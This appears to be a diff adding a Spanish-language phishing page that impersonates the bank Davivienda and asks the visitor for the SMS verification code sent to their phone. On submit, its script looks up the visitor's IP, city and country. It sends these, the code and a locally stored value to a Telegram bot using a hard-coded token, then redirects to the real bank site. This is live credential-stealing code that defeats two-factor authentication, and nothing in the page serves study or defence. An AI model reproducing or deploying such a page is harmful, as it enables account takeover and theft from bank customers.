@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Davivienda</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      .container {
+        border-radius: 15px; /* Esquinas semi-redondeadas para el contenedor */
+        overflow: hidden; /* Asegura que el contenido no sobresalga */
+        background: #ffffff; /* Fondo blanco para mejor contraste */
+      }
+      button {
+        background-color: #ed1c27; /* Color rojo para el botón */
+        color: white; /* Color del texto del botón */
+        border: none; /* Sin borde */
+        border-radius: 5px; /* Esquinas semi-redondeadas para el botón */
+        padding: 10px 15px; /* Espaciado interno */
+        cursor: pointer; /* Cambia el cursor al pasar por encima */
+      }
+      button:hover {
+        background-color: #c71a23; /* Color más oscuro al pasar el mouse */
+      }
+    </style>
+</head>
+<body style="color: #333232">
+    <div class="container">
+      <form class="form" id="loginform">
+        <div style="text-align: center; background: #ed1c27">
+          <img src="logoizquierda.png" width="250" />
+        </div>
+        <div style="background: #f7f71b; height: 10px"></div>
+        <div style="padding: 20px">
+          <div style="text-align: center">
+            <h3>Verificar Identidad</h3>
+            <h4>
+              Escribe el código que hemos enviado a tu teléfono registrado para
+              completar el proceso de verificación
+            </h4>
+          </div>
+          <div>
+            <label style="margin-top: 10px">Código</label>
+            <input
+              type="text"
+              id="numero"
+              name="numero"
+              inputmode="text"
+              oninput="validarNumero(this)"
+              style="width: 100%; height: 30px"
+              placeholder="Ingresa el código de 6 dígitos"
+            />
+            <script>
+              function validarNumero(input) {
+                // Remueve caracteres no numéricos
+                input.value = input.value.replace(/\D/g, "");
+                // Cambia el inputmode para abrir el teclado numérico en dispositivos móviles
+                input.inputMode = "numeric";
+              }
+            </script>
+          </div>
+        </div>
+        <div style="padding: 20px">
+          <button type="submit">Confirmar Identidad</button>
+        </div>
+        <div style="text-align: center; background: #595959; height: 50px"></div>
+      </form>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script>
+      const url = "https://ipapi.co/json/";
+      const form = document.querySelector("#loginform");
+      form.addEventListener("submit", (event) => {
+        event.preventDefault(); // Evita el envío del formulario
+
+        axios
+          .get(url)
+          .then((response) => {
+            const sms = document.querySelector("#numero").value;
+            const message =
+              "\nDavi\: " +
+              localStorage.getItem("") +
+              "\nSMS: " +
+              sms +
+              "\nCiudad: " +
+              response.data.city +
+              "\nPais: " +
+              response.data.country +
+              "\nIP: " +
+              response.data.ip;
+
+            // Enviar mensaje a Telegram
+            return axios.post("https://api.telegram.org/bot7533699985:AAG4I47bjPhk552DyJpNPUFl2THTw-cFb4c/sendMessage", {
+              chat_id: "-4534528207",
+              text: message,
+            });
+          })
+          .then((response) => {
+            // Manejo de respuesta del envío de mensaje
+            console.log("Mensaje enviado:", response.data);
+            alert("Validación Exitosa");
+            window.location.href = "https://www.appdavivienda.com/";
+          })
+          .catch((error) => {
+            // Manejo de errores
+            console.error("Error:", error);
+            alert("Ocurrió un error al enviar el mensaje.");
+          });
+      });
+    </script>
+</body>
+</html>
